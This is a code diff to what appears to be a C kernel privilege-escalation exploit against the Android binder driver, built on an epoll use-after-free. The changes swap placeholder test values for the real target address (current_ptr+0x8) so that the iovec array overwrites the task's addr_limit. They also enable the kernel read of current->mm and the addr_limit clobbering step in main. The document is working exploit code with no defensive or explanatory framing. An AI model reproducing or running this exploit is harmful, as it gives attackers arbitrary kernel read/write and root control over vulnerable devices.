@@ -167,6 +167,7 @@ void clobber_addr_limit(void)
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
 
   unsigned long testDatum = 12;
+  unsigned long testDatum2 = 13;
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
   memset(iovec_array, 0, sizeof(iovec_array));
   
@@ -175,7 +176,7 @@ void clobber_addr_limit(void)
     sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
     &testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
-    (unsigned long)&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    (unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
   memcpy(testFill, second_write_chunk, sizeof(second_write_chunk));
@@ -270,14 +271,15 @@ void clobber_addr_limit(void)
     int recvmsg_result = recvmmsg(socks[0], &mmsg, 1, MSG_WAITALL, &timeout);  */
 
     printf("PARENT: testDatum = %lx\n", testDatum);
+    printf("PARENT: testDatum2 = %lx\n", testDatum2);
     hexdump_memory(dataBuffer, 16);
     hexdump_memory(dataBuffer+UAF_SPINLOCK-16, 16);
   
   printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
       totalLength);
  // sleep(2);
- // unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
- // printf("current->mm == 0x%lx\n", current_mm);
+  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
+  printf("current->mm == 0x%lx\n", current_mm);
 }
 
 int kernel_rw_pipe[2];
@@ -339,7 +341,7 @@ int main(int argc, char** argv) {
   if (leakSize >= 0xe8 + 0x8) {
       memcpy(&current_ptr, leaked+0xe8, 8);
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
-//      printf("Clobbering addr_limit\n");
+      printf("Clobbering addr_limit\n");
       clobber_addr_limit();
       leak_data(leaked, leakSize);
       hexdump_memory(leaked, leakSize);
